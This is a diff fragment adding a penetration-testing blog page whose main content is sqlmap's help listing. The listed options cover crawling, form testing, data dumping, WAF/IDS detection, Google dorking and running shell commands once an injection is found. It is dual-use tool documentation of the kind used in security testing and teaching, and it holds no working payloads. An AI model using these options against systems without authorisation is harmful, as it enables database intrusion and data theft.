+    <span class="o">--</span><span class="nx">batch</span>             <span class="nx">Never</span> <span class="nx">ask</span> <span class="k">for</span> <span class="nx">user</span> <span class="nx">input</span><span class="p">,</span> <span class="nx">use</span> <span class="nx">the</span> <span class="k">default</span> <span class="nx">behaviour</span>
+    <span class="o">--</span><span class="nx">charset</span><span class="o">=</span><span class="nx">CHARSET</span>   <span class="nx">Force</span> <span class="nx">character</span> <span class="nx">encoding</span> <span class="nx">used</span> <span class="k">for</span> <span class="nx">data</span> <span class="nx">retrieval</span>
+    <span class="o">--</span><span class="nx">crawl</span><span class="o">=</span><span class="nx">CRAWLDEPTH</span>  <span class="nx">Crawl</span> <span class="nx">the</span> <span class="nx">website</span> <span class="nx">starting</span> <span class="nx">from</span> <span class="nx">the</span> <span class="nx">target</span> <span class="nx">URL</span>
+    <span class="o">--</span><span class="nx">csv</span><span class="o">-</span><span class="nx">del</span><span class="o">=</span><span class="nx">CSVDEL</span>    <span class="nx">Delimiting</span> <span class="nx">character</span> <span class="nx">used</span> <span class="k">in</span> <span class="nx">CSV</span> <span class="nx">output</span> <span class="p">(</span><span class="k">default</span> <span class="s2">&quot;,&quot;</span><span class="p">)</span>
+    <span class="o">--</span><span class="nx">dump</span><span class="o">-</span><span class="nx">format</span><span class="o">=</span><span class="nx">DU</span><span class="p">..</span>  <span class="nx">Format</span> <span class="nx">of</span> <span class="nx">dumped</span> <span class="nx">data</span> <span class="p">(</span><span class="nx">CSV</span> <span class="p">(</span><span class="k">default</span><span class="p">),</span> <span class="nx">HTML</span> <span class="nx">or</span> <span class="nx">SQLITE</span><span class="p">)</span>
+    <span class="o">--</span><span class="nx">eta</span>               <span class="nx">Display</span> <span class="k">for</span> <span class="nx">each</span> <span class="nx">output</span> <span class="nx">the</span> <span class="nx">estimated</span> <span class="nx">time</span> <span class="nx">of</span> <span class="nx">arrival</span>
+    <span class="o">--</span><span class="nx">flush</span><span class="o">-</span><span class="nx">session</span>     <span class="nx">Flush</span> <span class="nx">session</span> <span class="nx">files</span> <span class="k">for</span> <span class="nx">current</span> <span class="nx">target</span>
+    <span class="o">--</span><span class="nx">forms</span>             <span class="nx">Parse</span> <span class="nx">and</span> <span class="nx">test</span> <span class="nx">forms</span> <span class="nx">on</span> <span class="nx">target</span> <span class="nx">URL</span>
+    <span class="o">--</span><span class="nx">fresh</span><span class="o">-</span><span class="nx">queries</span>     <span class="nx">Ignore</span> <span class="nx">query</span> <span class="nx">results</span> <span class="nx">stored</span> <span class="k">in</span> <span class="nx">session</span> <span class="nx">file</span>
+    <span class="o">--</span><span class="nx">hex</span>               <span class="nx">Use</span> <span class="nx">DBMS</span> <span class="nx">hex</span> <span class="kd">function</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="k">for</span> <span class="nx">data</span> <span class="nx">retrieval</span>
+    <span class="o">--</span><span class="nx">output</span><span class="o">-</span><span class="nx">dir</span><span class="o">=</span><span class="nx">ODIR</span>   <span class="nx">Custom</span> <span class="nx">output</span> <span class="nx">directory</span> <span class="nx">path</span>
+    <span class="o">--</span><span class="nx">parse</span><span class="o">-</span><span class="nx">errors</span>      <span class="nx">Parse</span> <span class="nx">and</span> <span class="nx">display</span> <span class="nx">DBMS</span> <span class="nx">error</span> <span class="nx">messages</span> <span class="nx">from</span> <span class="nx">responses</span>
+    <span class="o">--</span><span class="nx">pivot</span><span class="o">-</span><span class="nx">column</span><span class="o">=</span><span class="nx">P</span><span class="p">..</span>  <span class="nx">Pivot</span> <span class="nx">column</span> <span class="nx">name</span>
+    <span class="o">--</span><span class="nx">save</span>              <span class="nx">Save</span> <span class="nx">options</span> <span class="nx">to</span> <span class="nx">a</span> <span class="nx">configuration</span> <span class="nx">INI</span> <span class="nx">file</span>
+    <span class="o">--</span><span class="nx">scope</span><span class="o">=</span><span class="nx">SCOPE</span>       <span class="nx">Regexp</span> <span class="nx">to</span> <span class="nx">filter</span> <span class="nx">targets</span> <span class="nx">from</span> <span class="nx">provided</span> <span class="nx">proxy</span> <span class="nx">log</span>
+    <span class="o">--</span><span class="nx">test</span><span class="o">-</span><span class="nx">filter</span><span class="o">=</span><span class="nx">TE</span><span class="p">..</span>  <span class="nx">Select</span> <span class="nx">tests</span> <span class="nx">by</span> <span class="nx">payloads</span> <span class="nx">and</span><span class="o">/</span><span class="nx">or</span> <span class="nx">titles</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">g</span><span class="p">.</span> <span class="nx">ROW</span><span class="p">)</span>
+    <span class="o">--</span><span class="nx">update</span>            <span class="nx">Update</span> <span class="nx">sqlmap</span>
+
+<span class="nx">Miscellaneous</span><span class="o">:</span>
+    <span class="o">-</span><span class="nx">z</span> <span class="nx">MNEMONICS</span>        <span class="nx">Use</span> <span class="kr">short</span> <span class="nx">mnemonics</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">g</span><span class="p">.</span> <span class="s2">&quot;flu,bat,ban,tec=EU&quot;</span><span class="p">)</span>
+    <span class="o">--</span><span class="nx">alert</span><span class="o">=</span><span class="nx">ALERT</span>       <span class="nx">Run</span> <span class="nx">shell</span> <span class="nx">command</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="nx">when</span> <span class="nx">SQL</span> <span class="nx">injection</span> <span class="nx">is</span> <span class="nx">found</span>
+    <span class="o">--</span><span class="nx">answers</span><span class="o">=</span><span class="nx">ANSWERS</span>   <span class="nx">Set</span> <span class="nx">question</span> <span class="nx">answers</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">g</span><span class="p">.</span> <span class="s2">&quot;quit=N,follow=N&quot;</span><span class="p">)</span>
+    <span class="o">--</span><span class="nx">beep</span>              <span class="nx">Make</span> <span class="nx">a</span> <span class="nx">beep</span> <span class="nx">sound</span> <span class="nx">when</span> <span class="nx">SQL</span> <span class="nx">injection</span> <span class="nx">is</span> <span class="nx">found</span>
+    <span class="o">--</span><span class="nx">check</span><span class="o">-</span><span class="nx">waf</span>         <span class="nx">Heuristically</span> <span class="nx">check</span> <span class="k">for</span> <span class="nx">WAF</span><span class="o">/</span><span class="nx">IPS</span><span class="o">/</span><span class="nx">IDS</span> <span class="nx">protection</span>
+    <span class="o">--</span><span class="nx">cleanup</span>           <span class="nx">Clean</span> <span class="nx">up</span> <span class="nx">the</span> <span class="nx">DBMS</span> <span class="nx">from</span> <span class="nx">sqlmap</span> <span class="nx">specific</span> <span class="nx">UDF</span> <span class="nx">and</span> <span class="nx">tables</span>
+    <span class="o">--</span><span class="nx">dependencies</span>      <span class="nx">Check</span> <span class="k">for</span> <span class="nx">missing</span> <span class="p">(</span><span class="nx">non</span><span class="o">-</span><span class="nx">core</span><span class="p">)</span> <span class="nx">sqlmap</span> <span class="nx">dependencies</span>
+    <span class="o">--</span><span class="nx">disable</span><span class="o">-</span><span class="nx">coloring</span>  <span class="nx">Disable</span> <span class="nx">console</span> <span class="nx">output</span> <span class="nx">coloring</span>
+    <span class="o">--</span><span class="nx">gpage</span><span class="o">=</span><span class="nx">GOOGLEPAGE</span>  <span class="nx">Use</span> <span class="nx">Google</span> <span class="nx">dork</span> <span class="nx">results</span> <span class="nx">from</span> <span class="nx">specified</span> <span class="nx">page</span> <span class="nx">number</span>
+    <span class="o">--</span><span class="nx">identify</span><span class="o">-</span><span class="nx">waf</span>      <span class="nx">Make</span> <span class="nx">a</span> <span class="nx">through</span> <span class="nx">testing</span> <span class="k">for</span> <span class="nx">a</span> <span class="nx">WAF</span><span class="o">/</span><span class="nx">IPS</span><span class="o">/</span><span class="nx">IDS</span> <span class="nx">protection</span>
+    <span class="o">--</span><span class="nx">mobile</span>            <span class="nx">Imitate</span> <span class="nx">smartphone</span> <span class="nx">through</span> <span class="nx">HTTP</span> <span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span> <span class="nx">header</span>
+    <span class="o">--</span><span class="nx">page</span><span class="o">-</span><span class="nx">rank</span>         <span class="nx">Display</span> <span class="nx">page</span> <span class="nx">rank</span> <span class="p">(</span><span class="nx">PR</span><span class="p">)</span> <span class="k">for</span> <span class="nx">Google</span> <span class="nx">dork</span> <span class="nx">results</span>
+    <span class="o">--</span><span class="nx">purge</span><span class="o">-</span><span class="nx">output</span>      <span class="nx">Safely</span> <span class="nx">remove</span> <span class="nx">all</span> <span class="nx">content</span> <span class="nx">from</span> <span class="nx">output</span> <span class="nx">directory</span>
+    <span class="o">--</span><span class="nx">smart</span>             <span class="nx">Conduct</span> <span class="nx">through</span> <span class="nx">tests</span> <span class="nx">only</span> <span class="k">if</span> <span class="nx">positive</span> <span class="nx">heuristic</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span>
+    <span class="o">--</span><span class="nx">wizard</span>            <span class="nx">Simple</span> <span class="nx">wizard</span> <span class="kr">interface</span> <span class="k">for</span> <span class="nx">beginner</span> <span class="nx">users</span>
+
+<span class="nx">Press</span> <span class="nx">Enter</span> <span class="nx">to</span> <span class="k">continue</span><span class="p">...</span>
+
+<span class="cp">[</span><span class="o">*</span><span class="cp">]</span> <span class="nx">shutting</span> <span class="nx">down</span> <span class="nx">at</span> <span class="mi">14</span><span class="o">:</span><span class="mi">09</span><span class="o">:</span><span class="mi">12</span>
+</pre></div>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+                <div class="social">
+                        <h2>social</h2>
+                        <ul>
+                            <li><a href="http://stupentest.net/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>
+
+                            <li><a href="https://twitter.com/lllamaboy">Twitter</a></li>
+                            <li><a href="https://github.com/lllama">Github</a></li>
+                        </ul>
+                </div><!-- /.social -->
+        </section><!-- /#extras -->
+
+        <footer id="contentinfo" class="body">
+                <address id="about" class="vcard body">
+                Proudly powered by <a href="http://getpelican.com/">Pelican</a>, which takes great advantage of <a href="http://python.org">Python</a>.
+                </address><!-- /#about -->
+
+                <p>The theme is by <a href="http://coding.smashingmagazine.com/2009/08/04/designing-a-html-5-layout-from-scratch/">Smashing Magazine</a>, thanks!</p>
+        </footer><!-- /#contentinfo -->
+
+</body>
+</html>
